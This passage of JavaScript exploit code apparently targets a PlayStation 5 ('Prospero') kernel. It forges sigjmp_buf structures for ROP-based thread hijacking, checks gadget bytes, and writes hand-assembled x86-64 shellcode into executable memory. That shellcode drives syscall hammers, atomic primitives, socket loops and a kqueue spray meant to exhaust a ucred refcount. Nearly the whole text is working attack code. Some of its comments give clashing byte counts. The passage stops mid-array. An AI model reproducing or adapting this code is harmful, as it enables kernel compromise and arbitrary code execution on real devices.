        //         Must be a valid userspace ptr OR NULL.
        //         Passing 0 (null) causes EFAULT if the syscall is interrupted.
        //
        // struct timespec layout (16 bytes, 8-byte aligned):
        //   +0x00  tv_sec   (int64)   seconds
        //   +0x08  tv_nsec  (int64)   nanoseconds  [0, 999999999]
        //
        // EINTR handling: if nanosleep is interrupted by a signal, it returns EINTR
        // and writes remaining time to rmtp. We retry with rmtp as the new rqtp
        // until the full sleep completes or the retry budget is exhausted.
        //
        // Pool layout (8 timespecs, each 16 bytes = 128 bytes total):
        //   TS_10MS   [0]   0s + 10,000,000ns
        //   TS_50MS   [1]   0s + 50,000,000ns
        //   TS_100MS  [2]   0s + 100,000,000ns
        //   TS_1SEC   [3]   1s + 0ns
        //   TS_3SEC   [4]   3s + 0ns
        //   TS_RMTP   [5]   scratch buffer for rmtp (remaining-time output)
        //   TS_CUSTOM [6]   reusable slot for nanosleep_ms() / nanosleep_ns()
        //   TS_PAD    [7]   reserved / alignment

        const TIMESPEC_SIZE = 16n;
        const TS_POOL_COUNT = 8n;

        let ts_pool = 0n;
        let TS_10MS = 0n;
        let TS_50MS = 0n;
        let TS_100MS = 0n;
        let TS_1SEC = 0n;
        let TS_3SEC = 0n;
        let TS_RMTP = 0n;  // persistent rmtp scratch — prevents EFAULT on EINTR
        let TS_CUSTOM = 0n;  // reusable slot for on-demand durations
        let ts_ready = false;

        function write_timespec(addr, sec, nsec) {
            // Type-safe write: always coerce to BigInt, validate nsec range.
            sec = BigInt(sec);
            nsec = BigInt(nsec);
            if (sec < 0n) throw new Error("write_timespec: negative tv_sec");
            if (nsec < 0n || nsec >= 1000000000n)
                throw new Error("write_timespec: tv_nsec out of range [0,999999999]: " + nsec);
            write64(addr + 0n, sec);
            write64(addr + 8n, nsec);
        }

        function init_sleep_structures() {
            if (ts_ready) return;

            // Single allocation for the entire pool — no fragmentation, no re-malloc
            ts_pool = malloc(TIMESPEC_SIZE * TS_POOL_COUNT);

            TS_10MS = ts_pool + TIMESPEC_SIZE * 0n;
            TS_50MS = ts_pool + TIMESPEC_SIZE * 1n;
            TS_100MS = ts_pool + TIMESPEC_SIZE * 2n;
            TS_1SEC = ts_pool + TIMESPEC_SIZE * 3n;
            TS_3SEC = ts_pool + TIMESPEC_SIZE * 4n;
            TS_RMTP = ts_pool + TIMESPEC_SIZE * 5n;
            TS_CUSTOM = ts_pool + TIMESPEC_SIZE * 6n;
            // TS_PAD at index 7 — zero-initialized, unused

            // Zero entire pool first for deterministic initial state
            for (let i = 0n; i < TIMESPEC_SIZE * TS_POOL_COUNT; i += 8n)
                write64(ts_pool + i, 0n);

            // Write all preset durations
            write_timespec(TS_10MS, 0n, 10000000n);   // 10ms
            write_timespec(TS_50MS, 0n, 50000000n);   // 50ms
            write_timespec(TS_100MS, 0n, 100000000n);  // 100ms
            write_timespec(TS_1SEC, 1n, 0n);           // 1s
            write_timespec(TS_3SEC, 3n, 0n);           // 3s
            // TS_RMTP: zero (will be overwritten by kernel on EINTR)
            // TS_CUSTOM: zero (written per-call)

            ts_ready = true;
        }

        function nanosleep_safe(rqtp) {
            // ABI-correct nanosleep with EINTR retry and persistent rmtp buffer.
            //
            // rqtp: userspace pointer to a timespec (from ts_pool — never 0).
            // rmtp: TS_RMTP (persistent scratch) — safe even on EINTR signal delivery.
            //
            // EINTR retry: if interrupted, remaining time is in TS_RMTP.
            //   Swap rqtp = TS_RMTP and retry until completion or retry budget.
            if (!ts_ready || ts_pool === 0n) {
                emergency_worker_abort("nanosleep_safe: sleep pool not initialized");
            }

            // Zero the rmtp buffer before the call to detect partial sleeps
            write64(TS_RMTP + 0n, 0n);
            write64(TS_RMTP + 8n, 0n);

            let cur_rqtp = rqtp;
            const MAX_RETRIES = 32;
            for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
                const ret = safe_syscall(SYSCALL.nanosleep, cur_rqtp, TS_RMTP);
                if (ret === 0n) return;  // completed cleanly

                // EINTR = -4 as signed, or 0xFFFFFFFFFFFFFFFC as unsigned 64-bit
                const is_eintr = (ret === 0xFFFFFFFFFFFFFFFCn) || (ret === BigInt(-4));
                if (is_eintr) {
                    // Remaining time is in TS_RMTP — retry with that as the new rqtp
                    const rem_sec = read64(TS_RMTP + 0n);
                    const rem_nsec = read64(TS_RMTP + 8n);
                    if (rem_sec === 0n && rem_nsec === 0n) return;  // nothing left to sleep
                    // Swap to TS_RMTP as the new request and zero a fresh rmtp slot
                    cur_rqtp = TS_RMTP;
                    write64(TS_RMTP + 0n, rem_sec);
                    write64(TS_RMTP + 8n, rem_nsec);
                    continue;
                }
                // Any other error (EINVAL, EFAULT): abort with details
                emergency_worker_abort("nanosleep_safe: unexpected errno: 0x" + ret.toString(16));
            }
            // Retry budget exhausted — sleep still not complete, continue execution
            // rather than aborting (worst case: slightly shorter sleep)
        }

        function nanosleep_ns(nsec) {
            // Sleep for an arbitrary nanosecond count using the reusable TS_CUSTOM slot.
            // Safe to call from hot paths — no malloc, no allocation.
            nsec = BigInt(nsec);
            const sec = nsec / 1000000000n;
            const rem = nsec % 1000000000n;
            write_timespec(TS_CUSTOM, sec, rem);
            nanosleep_safe(TS_CUSTOM);
        }

        function nanosleep_ms(ms) {
            nanosleep_ns(BigInt(ms) * 1000000n);
        }

        // Preset convenience wrappers — no allocation, no computation
        function exploit_sleep_10ms() { nanosleep_safe(TS_10MS); }
        function exploit_sleep_50ms() { nanosleep_safe(TS_50MS); }
        function exploit_sleep_100ms() { nanosleep_safe(TS_100MS); }
        function exploit_sleep_1sec() { nanosleep_safe(TS_1SEC); }
        function exploit_sleep_3sec() { nanosleep_safe(TS_3SEC); }

        init_sleep_structures();

        // --- ABI CORRECTNESS & RUNTIME STABILITY ---
        function emergency_worker_abort(msg) {
            throw new Error("Emergency Abort: " + msg);
        }

        // --- PROSPERO/FREEBSD SIGJMP_BUF ABI ---
        //
        // FreeBSD x86-64 jmp_buf layout (from /usr/include/machine/setjmp.h):
        // The struct has _JBLEN=12 longs (12 * 8 = 96 bytes = 0x60).
        //
        //   Index  Offset  Register
        //     0    0x00    _JB_RBX  (rbx)
        //     1    0x08    _JB_RBP  (rbp)
        //     2    0x10    _JB_R12  (r12)
        //     3    0x18    _JB_R13  (r13)
        //     4    0x20    _JB_R14  (r14)
        //     5    0x28    _JB_R15  (r15)
        //     6    0x30    _JB_RSP  (rsp — stack pointer at setjmp call site)
        //     7    0x38    _JB_PC   (rip — return address / program counter)
        //     8    0x40    _JB_SIGMASK (signal mask lo)
        //     9    0x48    _JB_SIGMASK+8 (signal mask hi)
        //    10    0x50    _JB_FPSTATE (FP state ptr, 0 = none)
        //    11    0x58    [canary / padding]
        //
        // siglongjmp(jb, val) restores all of these registers then jumps to _JB_PC.
        // If any callee-saved register slot contains garbage, the thread's register
        // state is corrupted immediately on return from siglongjmp.
        //
        // Prospero-specific notes:
        //   - Signal mask slots (0x40, 0x48) should be 0 to avoid signal state corruption
        //   - FP state ptr (0x50) = 0 (no saved FP state)
        //   - Stack must be 16-byte aligned at the point siglongjmp "returns" to _JB_PC
        //
        // CANARY: We inject 0x1337BEEF1337BEEFn at offset 0x58 (index 11).
        // validate_jmpbuf_layout() checks this before every thread spawn.

        const JB_RBX = 0x00n;
        const JB_RBP = 0x08n;
        const JB_R12 = 0x10n;
        const JB_R13 = 0x18n;
        const JB_R14 = 0x20n;
        const JB_R15 = 0x28n;
        const JB_RSP = 0x30n;
        const JB_PC = 0x38n;  // rip
        const JB_SIGMASK = 0x40n;
        const JB_FPSTATE = 0x50n;
        const JB_CANARY = 0x58n;
        const JB_SIZE = 0x60n;
        const JB_CANARY_VAL = 0x1337BEEF1337BEEFn;

        function forge_prospero_jmpbuf(rip, rsp) {
            // Constructs a fully ABI-compliant FreeBSD/Prospero sigjmp_buf.
            // All callee-saved register slots are set to safe known-good values.
            // rip: target instruction pointer (where execution resumes after siglongjmp)
            // rsp: stack pointer for the new thread (must be 16-byte aligned)
            rip = BigInt(rip);
            rsp = BigInt(rsp);

            // Validate inputs before writing
            if (rip === 0n) emergency_worker_abort("forge_prospero_jmpbuf: null rip");
            if (rsp === 0n) emergency_worker_abort("forge_prospero_jmpbuf: null rsp");

            // Enforce 16-byte stack alignment (SysV ABI requirement at call site)
            // siglongjmp restores RSP then jumps to PC, so RSP must already be aligned.
            rsp = rsp & ~0xFn;

            let jb = malloc(JB_SIZE);
            for (let i = 0n; i < JB_SIZE; i += 8n) write64(jb + i, 0n);

            // Callee-saved registers: set to 0 (valid, harmless initial values)
            // Workers initialize their own registers in the ROP chain prologue.
            write64(jb + JB_RBX, 0n);    // rbx = 0
            write64(jb + JB_RBP, 0n);    // rbp = 0 (no frame chain needed)
            write64(jb + JB_R12, 0n);    // r12 = 0
            write64(jb + JB_R13, 0n);    // r13 = 0
            write64(jb + JB_R14, 0n);    // r14 = 0
            write64(jb + JB_R15, 0n);    // r15 = 0

            // Control registers
            write64(jb + JB_RSP, rsp);   // rsp: stack pointer
            write64(jb + JB_PC, rip);   // rip: target (ROP chain entry / shellcode)

            // Signal mask: 0 = don't modify signal mask on longjmp
            write64(jb + JB_SIGMASK, 0n);
            write64(jb + JB_SIGMASK + 8n, 0n);

            // FP state: 0 = no saved FP state (don't restore MXCSR/x87)
            write64(jb + JB_FPSTATE, 0n);

            // Integrity canary
            write64(jb + JB_CANARY, JB_CANARY_VAL);

            return jb;
        }

        function validate_jmpbuf_layout(jmp_buf_ptr) {
            // Strict ABI integrity checks before any siglongjmp-based thread spawn.
            // A corrupted jmp_buf will not be caught by the kernel — it will just
            // restore garbage registers and jump to a random address, causing a panic.
            const rip = read64(jmp_buf_ptr + JB_PC);
            const rsp = read64(jmp_buf_ptr + JB_RSP);
            const canary = read64(jmp_buf_ptr + JB_CANARY);

            // Canary check
            if (canary !== JB_CANARY_VAL) {
                emergency_worker_abort("jmp_buf canary corrupted: 0x" + canary.toString(16));
            }

            // RIP must be a non-null canonical userland address
            // Canonical: bits [63:48] must all be 0 (userland) or all 1 (kernel)
            // We only accept userland (bits[63:48] === 0)
            if (rip === 0n) {
                emergency_worker_abort("jmp_buf: null rip");
            }
            if ((rip >> 48n) !== 0n) {
                emergency_worker_abort("jmp_buf: non-canonical or kernel rip: 0x" + rip.toString(16));
            }

            // RSP must be a non-null, 16-byte aligned userland address
            if (rsp === 0n) {
                emergency_worker_abort("jmp_buf: null rsp");
            }
            if ((rsp & 0xFn) !== 0n) {
                emergency_worker_abort("jmp_buf: misaligned rsp: 0x" + rsp.toString(16));
            }
            if ((rsp >> 48n) !== 0n) {
                emergency_worker_abort("jmp_buf: non-canonical rsp: 0x" + rsp.toString(16));
            }

            // Signal mask slots must be zero (non-zero would corrupt thread signal state)
            const sm_lo = read64(jmp_buf_ptr + JB_SIGMASK);
            const sm_hi = read64(jmp_buf_ptr + JB_SIGMASK + 8n);
            if (sm_lo !== 0n || sm_hi !== 0n) {
                emergency_worker_abort("jmp_buf: non-zero signal mask (would corrupt thread sigmask)");
            }

            return true;
        }

        function enforce_stack_alignment(rop_chain, idx) {
            if ((idx % 2n) !== 0n) {
                write64(rop_chain + idx * 8n, RET);
                idx++;
            }
            return idx;
        }

        function preserve_callee_saved_registers(cb, idx, scratch) {
            write64(cb + idx * 8n, POP_RDI_RET); idx++;
            write64(cb + idx * 8n, scratch); idx++;
            write64(cb + idx * 8n, POP_RBX_RET); idx++;
            write64(cb + idx * 8n, scratch); idx++;
            return idx;
        }

        // --- ROP GADGET AUDITING ---
        // Verifies that every gadget address used in spawn_rop_worker actually contains
        // the expected x86-64 opcodes. Catches wrong offsets, ASLR failures, or framework
        // version mismatches before any chain is written.
        // Runs once per exploit session (cached by g_gadgets_verified).

        let g_gadgets_verified = false;

        function verify_gadget(addr, expected_bytes, name) {
            addr = BigInt(addr);
            // Address must be non-null and canonical userland (bits[63:48] == 0)
            if (addr === 0n)
                emergency_worker_abort("verify_gadget: null address for " + name);
            if ((addr >> 48n) !== 0n)
                emergency_worker_abort("verify_gadget: non-canonical/kernel addr for " + name + ": 0x" + addr.toString(16));
            // Read and verify each expected byte
            for (let i = 0; i < expected_bytes.length; i++) {
                const got = Number(read8(addr + BigInt(i)) & 0xFFn);
                if (got !== expected_bytes[i]) {
                    emergency_worker_abort(
                        "verify_gadget: " + name +
                        " byte[" + i + "] expected 0x" + expected_bytes[i].toString(16) +
                        " got 0x" + got.toString(16) +
                        " at 0x" + addr.toString(16));
                }
            }
        }

        function verify_rop_gadgets() {
            if (g_gadgets_verified) return;
            // Each entry: [gadget_global, expected_opcodes, name]
            // x86-64 single-byte pop: 0x58+reg (rax=0x58,rcx=0x59,rdx=0x5A,rbx=0x5B,
            //                                   rsp=0x5C,rbp=0x5D,rsi=0x5E,rdi=0x5F)
            // REX.B prefixed pop r8-r15: 0x41 0x58+reg
            // ret = 0xC3
            verify_gadget(RET, [0xC3], "RET");
            verify_gadget(POP_RDI_RET, [0x5F, 0xC3], "POP_RDI_RET");
            verify_gadget(POP_RSI_RET, [0x5E, 0xC3], "POP_RSI_RET");
            verify_gadget(POP_RDX_RET, [0x5A, 0xC3], "POP_RDX_RET");
            verify_gadget(POP_RCX_RET, [0x59, 0xC3], "POP_RCX_RET");
            verify_gadget(POP_RAX_RET, [0x58, 0xC3], "POP_RAX_RET");
            verify_gadget(POP_RBX_RET, [0x5B, 0xC3], "POP_RBX_RET");
            verify_gadget(POP_RSP_RET, [0x5C, 0xC3], "POP_RSP_RET");
            verify_gadget(POP_R8_RET, [0x41, 0x58, 0xC3], "POP_R8_RET");
            verify_gadget(MOV_RAX_DEREF_RAX_RET, [0x48, 0x8B, 0x00, 0xC3], "MOV_RAX_DEREF_RAX_RET");
            verify_gadget(MOV_DEREF_RDI_RAX_RET, [0x48, 0x89, 0x07, 0xC3], "MOV_DEREF_RDI_RAX_RET");
            g_gadgets_verified = true;
        }

        // --- ROP CHAIN SLOT VERIFICATION ---
        // After building a chain, re-reads key gadget slots from memory and checks
        // they contain exactly the value that was written. Catches write64 truncation,
        // alignment bugs, or heap corruption between chain write and chain execution.
        function verify_chain_slots(cb, slots) {
            for (let i = 0; i < slots.length; i++) {
                const { slot, expected, name } = slots[i];
                const got = read64(cb + slot * 8n);
                if (got !== BigInt(expected)) {
                    emergency_worker_abort(
                        "verify_chain_slots: slot " + slot + " (" + name + ")" +
                        " expected 0x" + BigInt(expected).toString(16) +
                        " got 0x" + got.toString(16));
                }
            }
        }

        // --- NATIVE EXEC_NTIMES SUBSYSTEM ---
        // Implements the Lua EXEC_SHELLCODE / exec_ntimes equivalent.
        // Completely removes JS event-loop involvement from the kqueue spray hot-path.
        //
        // BSD syscall ABI: sys_kqueueex(const char *path) -> int
        //   rdi = pointer to null-terminated path string
        //   rax = 0x143 (kqueueex syscall number on Prospero)
        //   SysV x86_64: rdi, rsi, rdx, rcx, r8, r9 for args
        //
        // Layout of the native argument block (64 bytes, 8-byte aligned):
        //   +0x00  rdi_value    - address of the invalid path string (0x800000000000)
        //   +0x08  loop_count   - number of iterations (BigInt 64-bit)
        //   +0x10  sysno        - syscall number (kqueueex = 0x143n on Prospero)
        //   +0x18  yield_every  - sched_yield interval (0 = never)
        //   +0x20  done_flag    - set to 1 by shellcode when loop finishes
        //   +0x28  padding[3]   - reserved for alignment

        const EXEC_ARG_SIZE = 64n;
        const EXEC_SC_SIZE = 0x100n;

        let g_exec_arg_block = 0n;   // persistent arg block (never re-malloced)
        let g_exec_sc_mem = 0n;   // RWX shellcode page
        let g_exec_fn = null; // func_wrap(shellcode) — direct synchronous call
        let g_exec_ready = false;

        function assemble_exec_shellcode() {
            // Verified 32-byte x86-64 SysV shellcode.
            // Entry: RDI = pointer to 64-byte arg_block.
            //
            // Arg block layout:
            //   [rbx+0x00]  path_ptr    (rdi for syscall)
            //   [rbx+0x08]  loop_count  (rcx)
            //   [rbx+0x10]  sysno       (rax)
            //   [rbx+0x20]  done_flag   (set to 1 before ret)
            //
            // Encoding breakdown:
            //   offset  0: 53           push rbx
            //   offset  1: 48 89 FB     mov rbx, rdi
            //   offset  4: 48 8B 3B     mov rdi, [rbx]         path_ptr
            //   offset  7: 48 8B 4B 08  mov rcx, [rbx+8]       count
            //   offset 11: 48 8B 43 10  mov rax, [rbx+16]      sysno
            //   .loop @ offset 15:
            //   offset 15: 0F 05        syscall
            //   offset 17: 48 FF C9     dec rcx
            //   offset 20: 75 F9        jnz .loop   disp=15-(22)=-7=0xF9
            //   .done @ offset 22:
            //   offset 22: 48 C7 43 20 01 00 00 00  mov [rbx+0x20], 1
            //   offset 30: 5B           pop rbx
            //   offset 31: C3           ret
            return new Uint8Array([
                0x53,                                             // push rbx
                0x48, 0x89, 0xFB,                                 // mov rbx, rdi
                0x48, 0x8B, 0x3B,                                 // mov rdi, [rbx]
                0x48, 0x8B, 0x4B, 0x08,                           // mov rcx, [rbx+8]
                0x48, 0x8B, 0x43, 0x10,                           // mov rax, [rbx+16]
                // .loop (offset 15)
                0x0F, 0x05,                                       // syscall
                0x48, 0xFF, 0xC9,                                 // dec rcx
                0x75, 0xF9,                                       // jnz .loop (-7)
                // .done (offset 22)
                0x48, 0xC7, 0x43, 0x20, 0x01, 0x00, 0x00, 0x00,  // mov [rbx+0x20], 1
                0x5B,                                             // pop rbx
                0xC3,                                             // ret
            ]);
        }

        function exec_ntimes_init() {
            if (g_exec_ready) return;

            g_exec_arg_block = malloc(EXEC_ARG_SIZE);
            for (let i = 0n; i < EXEC_ARG_SIZE; i += 8n) write64(g_exec_arg_block + i, 0n);

            // Map RWX page: PROT_READ|WRITE|EXEC=7, MAP_PRIVATE|MAP_ANON=0x1000
            g_exec_sc_mem = safe_syscall(SYSCALL.mmap, 0n, EXEC_SC_SIZE, 7n, 0x1000n, -1n, 0n);
            if (g_exec_sc_mem === 0xFFFFFFFFFFFFFFFFn || g_exec_sc_mem === 0n) {
                g_exec_sc_mem = 0n;
                g_exec_ready = true;
                return;
            }

            // Write verified 32-byte shellcode into RWX page
            const sc = assemble_exec_shellcode();
            for (let i = 0; i < sc.length; i++) {
                write8(g_exec_sc_mem + BigInt(i), BigInt(sc[i]));
            }

            // SFENCE: ensure shellcode bytes are committed before creating function ptr
            hw_sfence();

            // Wrap as direct callable — equivalent of Lua: func_wrap(SHELLCODE_BASE)
            g_exec_fn = func_wrap(g_exec_sc_mem);

            g_exec_ready = true;
        }

        function exec_ntimes(sysno, path_ptr, count) {
            // Native equivalent of Lua: exec_ntimes(count)
            // Executes syscall(sysno, path_ptr) exactly `count` times.
            // Native path: synchronous direct call via func_wrap — no pthread, no event loop.
            // JS fallback: tight for-loop, no GC yields.
            exec_ntimes_init();

            count = BigInt(count);
            sysno = BigInt(sysno);
            path_ptr = BigInt(path_ptr);

            if (g_exec_fn !== null) {
                // --- NATIVE SYNCHRONOUS PATH ---
                write64(g_exec_arg_block + 0n, path_ptr);  // rdi = path
                write64(g_exec_arg_block + 8n, count);     // rcx = count
                write64(g_exec_arg_block + 16n, sysno);     // rax = sysno
                write64(g_exec_arg_block + 32n, 0n);        // done_flag = 0
                hw_sfence(); // ensure writes visible before native call

                // Direct synchronous call — returns only after loop completes
                g_exec_fn(g_exec_arg_block);

                // Verify done_flag (sanity check)
                hw_lfence();
                if (read64(g_exec_arg_block + 32n) !== 1n) {
                    emergency_worker_abort("exec_ntimes: shellcode done_flag not set");
                }
            } else {
                // --- JS FALLBACK ---
                for (let i = 0n; i < count; i++) {
                    safe_syscall(sysno, path_ptr);
                }
            }
        }

        // --- Specialized spray wrappers built on exec_ntimes ---

        function kqueue_spray_ntimes(count) {
            // Hammer sys_kqueueex with a non-canonical address `count` times.
            // 0x800000000000 is above user-space: kernel returns EFAULT immediately
            // (fast path) while still consuming the ucred refcount.
            exec_ntimes(SYSCALL.kqueueex, 0x800000000000n, count);
        }

        function syscall_hammer(sysno, arg0, count) {
            exec_ntimes(sysno, arg0, count);
        }

        // === NATIVE SHELLCODE RUNTIME MANAGER ===
        //
        // Manages a pool of RWX shellcode blobs that handle timing-critical paths
        // entirely in native code, eliminating JS event-loop involvement during:
        //   - reclaim yield loops (sched_yield spam)
        //   - socket drain/blast (read/write N times)
        //   - UMTX wake blasts
        //   - Generic N-iteration syscall hammers
        //
        // RW→RX transition:
        //   All blobs are written into a single RW staging page, then mprotect'd
        //   to RX before func_wrap is called. This is W^X safe and more compatible
        //   with Prospero kernel hardening than persistent RWX pages.
        //
        // Generic hammer shellcode arg block layout (64 bytes):
        //   +0x00  arg0   (rdi)    first syscall argument
        //   +0x08  arg1   (rsi)    second syscall argument
        //   +0x10  arg2   (rdx)    third syscall argument
        //   +0x18  count  (rcx)    iteration count
        //   +0x20  sysno  (rax)    syscall number
        //   +0x28  done          set to 1 by shellcode on completion
        //   +0x30  result        last syscall return value (rax after final syscall)
        //   +0x38  padding
        //
        // Verified x86-64 encoding (40 bytes):
        //   offset  0: 53           push rbx
        //   offset  1: 48 89 FB     mov rbx, rdi       save arg_block ptr
        //   offset  4: 48 8B 3B     mov rdi, [rbx]     arg0
        //   offset  7: 48 8B 73 08  mov rsi, [rbx+8]   arg1
        //   offset 11: 48 8B 53 10  mov rdx, [rbx+16]  arg2
        //   offset 15: 48 8B 4B 18  mov rcx, [rbx+24]  count
        //   offset 19: 48 8B 43 20  mov rax, [rbx+32]  sysno
        //   .loop @ 23:
        //   offset 23: 0F 05        syscall
        //   offset 25: 48 FF C9     dec rcx
        //   offset 28: 75 F9        jnz .loop           disp = 23-30 = -7 = 0xF9
        //   .done @ 30:
        //   offset 30: 48 89 43 30  mov [rbx+0x30], rax  save result
        //   offset 34: 48 C7 43 28 01 00 00 00  mov [rbx+0x28], 1  done=1
        //   offset 42: 5B           pop rbx
        //   offset 43: C3           ret
        //   Total: 44 bytes

        const SC_RT_ARG_SIZE = 64n;
        const SC_RT_BLOB_ALIGN = 0x100n;  // each blob gets 256-byte aligned slot
        const SC_RT_BLOB_COUNT = 8n;      // max 8 blobs in the staging page
        const SC_RT_PAGE_SIZE = SC_RT_BLOB_ALIGN * SC_RT_BLOB_COUNT;  // 2048 bytes

        // PROT constants for mprotect
        const PROT_READ = 1n;
        const PROT_WRITE = 2n;
        const PROT_EXEC = 4n;
        const PROT_RW = PROT_READ | PROT_WRITE;  // 3
        const PROT_RX = PROT_READ | PROT_EXEC;   // 5
        const PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC; // 7

        let g_scrt_page = 0n;    // RW staging page → becomes RX after commit
        let g_scrt_args = 0n;    // arg block pool (SC_RT_ARG_SIZE * SC_RT_BLOB_COUNT)
        let g_scrt_ready = false;
        let g_scrt_locked = false; // true after mprotect RX (no more writes)

        // Blob slot assignments
        const BLOB_HAMMER = 0n;  // generic N-iteration syscall hammer
        const BLOB_XCHG = 1n;  // atomic XCHG (test-and-set)
        const BLOB_CAS = 2n;  // atomic CMPXCHG (compare-and-swap)
        const BLOB_FETCH_ADD = 3n;  // atomic LOCK XADD (fetch-add)
        const BLOB_WRITE_READ = 4n;  // write(fd_b,buf,sz)+read(fd_a,buf2,sz) × N
        const BLOB_GETSOCKOPT = 5n;  // getsockopt once → result in shared buf

        let g_blob_hammer_fn = null;
        let g_blob_xchg_fn = null;  // atomic_xchg64(addr, newval) → old
        let g_blob_cas_fn = null;  // atomic_cas64(addr, expected, desired) → old
        let g_blob_fetch_add_fn = null;  // atomic_fetch_add64(addr, delta) → old
        let g_blob_write_read_fn = null;  // native_sock_ping_pong(fd_b, buf_b, sz_b, fd_a, buf_a, sz_a, count)
        let g_blob_getsockopt_fn = null;  // native_getsockopt_once(sock, level, opt, buf, len_ptr)
        let g_blob_hammer_args = 0n;
        let g_blob_write_read_args = 0n;  // persistent arg block for BLOB_WRITE_READ
        let g_blob_getsockopt_args = 0n;  // persistent arg block for BLOB_GETSOCKOPT

        // Dedicated memory-backed lock words for atomic operations.
        // These MUST be in malloc'd memory (not JS variables) so that native
        // shellcode running on another core can observe writes via LOCK instructions.
        let g_kprim_lock = 0n;  // 8-byte: 0=free, 1=held
        let g_reclaim_lock = 0n;  // 8-byte: 0=free, 1=held
        let g_reclaim_gen_word = 0n;  // 8-byte: atomic generation counter

        function assemble_generic_hammer() {
            // 44-byte generic syscall loop (verified, see header comment)
            return new Uint8Array([
                0x53,                                             // push rbx
                0x48, 0x89, 0xFB,                                 // mov rbx, rdi
                0x48, 0x8B, 0x3B,                                 // mov rdi, [rbx]
                0x48, 0x8B, 0x73, 0x08,                           // mov rsi, [rbx+8]
                0x48, 0x8B, 0x53, 0x10,                           // mov rdx, [rbx+16]
                0x48, 0x8B, 0x4B, 0x18,                           // mov rcx, [rbx+24]
                0x48, 0x8B, 0x43, 0x20,                           // mov rax, [rbx+32]
                0x0F, 0x05,                                       // syscall (.loop @23)
                0x48, 0xFF, 0xC9,                                 // dec rcx
                0x75, 0xF9,                                       // jnz .loop
                0x48, 0x89, 0x43, 0x30,                           // mov [rbx+0x30], rax
                0x48, 0xC7, 0x43, 0x28, 0x01, 0x00, 0x00, 0x00,  // mov [rbx+0x28], 1
                0x5B,                                             // pop rbx
                0xC3,                                             // ret
            ]);
        }

        function assemble_xchg() {
            // atomic_xchg64(addr, newval) → old
            // Entry: rdi=addr, rsi=newval  Return: rax=old
            // XCHG r/m64, r64 is implicitly LOCKED — full memory barrier.
            //
            // Encoding:
            //   0: 48 87 37  xchg [rdi], rsi   ; rsi↔[rdi], now rsi=old, [rdi]=newval
            //   3: 48 89 F0  mov rax, rsi       ; rax = old value (return value)
            //   6: C3        ret
            return new Uint8Array([
                0x48, 0x87, 0x37,   // xchg [rdi], rsi
                0x48, 0x89, 0xF0,   // mov rax, rsi
                0xC3,               // ret
            ]);
        }

        function assemble_cas() {
            // atomic_cas64(addr, expected, desired) → old
            // Entry: rdi=addr, rsi=expected, rdx=desired  Return: rax=old
            // LOCK CMPXCHG: if [rdi]==rax, [rdi]=rdx, else rax=[rdi]
            //
            // Encoding:
            //   0: 48 8B C6              mov rax, rsi        ; rax = expected
            //   3: F0 48 0F B1 17        lock cmpxchg [rdi], rdx
            //   8: C3                    ret
            //
            // ModRM for cmpxchg [rdi], rdx:
            //   mod=00(mem), reg=rdx(2), rm=rdi(7) → 0b00_010_111 = 0x17
            return new Uint8Array([
                0x48, 0x8B, 0xC6,         // mov rax, rsi
                0xF0, 0x48, 0x0F, 0xB1, 0x17,  // lock cmpxchg [rdi], rdx
                0xC3,                     // ret
            ]);
        }

        function assemble_fetch_add() {
            // atomic_fetch_add64(addr, delta) → old
            // Entry: rdi=addr, rsi=delta  Return: rax=old
            // LOCK XADD [rdi], rax: temp=[rdi]; [rdi]+=rax; rax=temp
            //
            // Encoding:
            //   0: 48 89 F0          mov rax, rsi        ; rax = delta
            //   3: F0 48 0F C1 07    lock xadd [rdi], rax ; rax=old,[rdi]+=delta
            //   8: C3                ret
            //
            // ModRM for xadd [rdi], rax:
            //   mod=00(mem), reg=rax(0), rm=rdi(7) → 0b00_000_111 = 0x07
            return new Uint8Array([
                0x48, 0x89, 0xF0,         // mov rax, rsi
                0xF0, 0x48, 0x0F, 0xC1, 0x07,  // lock xadd [rdi], rax
                0xC3,                     // ret
            ]);
        }

        function assemble_write_read_pair() {
            // BLOB_WRITE_READ_PAIR: native socket ping-pong loop.
            // Executes: write(write_fd, wbuf, wsz);  read(read_fd, rbuf, rsz);  ×count
            //
            // JS calls: native_sock_ping_pong(fd_b, wbuf, wsz, fd_a, rbuf, rsz, count)
            //
            // Args block layout (64 bytes, all i64):
            //   [+0x00] write_fd   SYS_write first arg
            //   [+0x08] write_buf  buffer pointer
            //   [+0x10] write_size byte count
            //   [+0x18] read_fd    SYS_read first arg
            //   [+0x20] read_buf   buffer pointer
            //   [+0x28] read_size  byte count
            //   [+0x30] count      loop iterations (dec'd each round)
            //   [+0x38] done_flag  set to 1 on completion
            //
            // Register assignment (callee-saved to survive syscalls):
            //   r12 = args_block ptr (preserved across syscalls)
            //   r13 = (unused, reserved)
            //
            // SysV syscall ABI: rdi, rsi, rdx = arg0,1,2; rax = sysno
            // Syscall numbers (Prospero/FreeBSD): read=3, write=4
            //
            // Encoded bytes: 78 total
            //   Offset  Hex                       Disasm
            //   00      53                        push rbx
            //   01      41 54                     push r12
            //   03      4C 8B E7                  mov r12, rdi
            //   06      49 8B 7C 24 00            mov rdi, [r12+0]   ; write_fd
            //   0B      49 8B 74 24 08            mov rsi, [r12+8]   ; write_buf
            //   10      49 8B 54 24 10            mov rdx, [r12+16]  ; write_size
            //   15      B8 04 00 00 00            mov eax, 4         ; SYS_write
            //   1A      0F 05                     syscall
            //   1C      49 8B 7C 24 18            mov rdi, [r12+24]  ; read_fd
            //   21      49 8B 74 24 20            mov rsi, [r12+32]  ; read_buf
            //   26      49 8B 54 24 28            mov rdx, [r12+40]  ; read_size
            //   2B      B8 03 00 00 00            mov eax, 3         ; SYS_read
            //   30      0F 05                     syscall
            //   32      49 FF 4C 24 30            dec qword [r12+48] ; count--
            //   37      75 CD                     jnz -0x33 (.loop @0x06)
            //   39      49 C7 44 24 38 01 00 00 00 mov qword [r12+56],1  ; done
            //   42      41 5C                     pop r12
            //   44      5B                        pop rbx
            //   45      C3                        ret
            //   Total: 70 bytes
            return new Uint8Array([
                0x53,                               // push rbx
                0x41, 0x54,                         // push r12
                0x4C, 0x8B, 0xE7,                   // mov r12, rdi
                // .loop (@offset 6):
                0x49, 0x8B, 0x7C, 0x24, 0x00,       // mov rdi, [r12+0]   write_fd
                0x49, 0x8B, 0x74, 0x24, 0x08,       // mov rsi, [r12+8]   write_buf
                0x49, 0x8B, 0x54, 0x24, 0x10,       // mov rdx, [r12+16]  write_size
                0xB8, 0x04, 0x00, 0x00, 0x00,       // mov eax, 4         SYS_write
